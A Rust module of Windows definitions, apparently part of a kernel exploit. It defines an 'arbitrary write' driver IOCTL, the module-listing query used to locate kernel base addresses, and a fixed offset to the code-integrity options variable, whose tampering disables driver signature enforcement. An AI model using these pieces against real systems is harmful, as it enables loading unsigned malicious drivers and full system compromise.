use windows::Win32::System::Ioctl::{FILE_ANY_ACCESS, FILE_DEVICE_UNKNOWN, METHOD_NEITHER};
use windows::Wdk::System::SystemInformation::SYSTEM_INFORMATION_CLASS;
use std::ffi::c_void;
use std::os::raw::{c_ulong, c_ushort, c_char};




macro_rules! CTL_CODE {
    ($DeviceType:expr, $Function:expr, $Method:expr, $Access:expr) => {
        ($DeviceType << 16) | ($Access << 14) | ($Function << 2) | $Method
    };
}

pub const IOCTL_ARBITRARY_WRITE: u32 =
    CTL_CODE!(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS);

pub const SYSTEM_MODULE_INFORMATION : SYSTEM_INFORMATION_CLASS = SYSTEM_INFORMATION_CLASS(0x0B);

pub const OFFSET_TO_G_CIOPTION : usize = 0x3a438;


#[repr(C, packed)]
#[derive(Debug, Copy, Clone)]
pub struct  _RTL_PROCESS_MODULE_INFORMATION {
    pub Section: *mut c_void,
    pub MappedBase: *mut c_void,
    pub ImageBase: *mut c_void,
    pub ImageSize: c_ulong,
    pub Flags: c_ulong,
    pub LoadOrderIndex: c_ushort,
    pub InitOrderIndex: c_ushort,
    pub LoadCount: c_ushort,
    pub OffsetToFileName: c_ushort,
    pub FullPathName: [u8; 256],
}

#[repr(C)]
#[derive(Debug)]
pub struct RTLProcessModules {
    pub number_of_modules: usize,
    pub modules: [_RTL_PROCESS_MODULE_INFORMATION; 1], // Placeholder for dynamic array
}




#[repr(packed)]
#[derive(Debug)]
pub struct ModuleEntry(_RTL_PROCESS_MODULE_INFORMATION);

impl ModuleEntry {
    pub fn Section(&self) -> *mut c_void {
        self.0.Section
    }
    pub fn MappedBase(&self) -> *mut c_void {
        self.0.MappedBase
    }
    pub fn ImageBase(&self) ->  *mut c_void {
        self.0.ImageBase
    }
    pub fn ImageSize(&self) -> c_ulong {
        self.0.ImageSize
    }
    pub fn Flags(&self) -> c_ulong {
        self.0.Flags
    }
    pub fn LoadOrderIndex(&self) -> c_ushort {
        self.0.LoadOrderIndex
    }
    pub fn InitOrderIndex(&self) -> c_ushort {
        self.0.InitOrderIndex
    }
    pub fn LoadCount(&self) -> c_ushort {
        self.0.LoadCount
    }
    pub fn OffsetToFileName(&self) -> c_ushort {
        self.0.OffsetToFileName
    }
    pub fn FullPathName(&self) ->  [u8; 256] {
        self.0.FullPathName
    }
}